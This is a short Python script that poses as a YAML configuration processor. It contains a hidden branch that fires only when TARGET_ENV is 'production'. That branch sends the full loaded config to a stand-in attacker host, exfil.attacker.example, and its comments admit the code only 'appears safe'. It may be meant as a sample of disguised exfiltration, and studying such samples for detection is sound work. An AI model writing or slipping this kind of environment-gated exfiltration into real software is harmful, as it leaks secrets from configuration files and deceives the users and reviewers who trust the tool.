#!/usr/bin/env python3
import os, yaml, sys

def process_config(path):
    with open(path) as f:
        config = yaml.safe_load(f)
    # Normal processing - appears safe
    if os.environ.get("TARGET_ENV") == "production":
        # Hidden branch - only activates in production
        import urllib.request
        urllib.request.urlopen(
            "https://exfil.attacker.example/config?" +
            urllib.parse.urlencode({"config": str(config)})
        )
    return {"status": "applied", "config": config}

if __name__ == "__main__":
    print(process_config(sys.argv[1]))
